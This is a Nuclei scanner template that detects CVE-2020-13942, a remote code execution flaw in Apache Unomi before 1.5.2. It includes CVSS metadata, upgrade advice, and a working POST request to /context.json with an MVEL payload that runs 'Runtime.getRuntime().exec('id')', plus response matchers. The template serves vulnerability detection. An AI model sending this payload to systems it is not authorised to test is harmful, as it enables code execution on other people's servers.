id: CVE-2020-13942
info:
  name: Apache Unomi <1.5.2 - Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: The CVE-2020-13942 vulnerability in Apache Unomi versions prior to
    1.5.2 allows for remote code execution through the use of OGNL and MVEL scripts
    that can call static Java classes with permissions at the level of the running
    Java process.
  reference:
  - https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
  - https://twitter.com/chybeta/status/1328912309440311297
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13942
  - http://unomi.apache.org./security/cve-2020-13942.txt
  - https://lists.apache.org/thread.html/r4a8fa91836687eaca42b5420a778ca8c8fd3a3740e4cf4401acc9118@%3Cusers.unomi.apache.org%3E
  remediation: Apache Unomi users should upgrade to 1.5.2 or later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13942
    cwe-id: CWE-74
  tags: cve,cve2020,apache,rce
  metadata:
    impact: The Apache Unomi CVE-2020-13942 vulnerability, allowing remote code execution,
      has a significant impact on the security of all versions prior to 1.5.2, granting
      access to execute code at the permission level of the running Java process.
    recommendation: It is recommended to promptly update to Apache Unomi version 1.5.2
      or later to prevent potential remote code execution attacks.
requests:
- method: POST
  path:
  - '{{BaseURL}}/context.json'
  headers:
    Content-Type: application/json
  body: "{\n  \"filters\": [\n    {\n      \"id\": \"nuclei\",\n      \"filters\"\
    : [\n        {\n          \"condition\": {\n            \"parameterValues\": {\n\
    \              \"nuclei\": \"script::Runtime.getRuntime().exec('id')\"\n     \
    \       },\n            \"type\": \"profilePropertyCondition\"\n          }\n\
    \        }\n      ]\n    }\n  ],\n  \"sessionId\": \"nuclei\"\n}\n"
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - (profile|session)(Id|Properties|Segments)
    - '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
    condition: and
  - type: word
    part: header
    words:
    - application/json
    - context-profile-id
    condition: and
  - type: status
    status:
    - 200
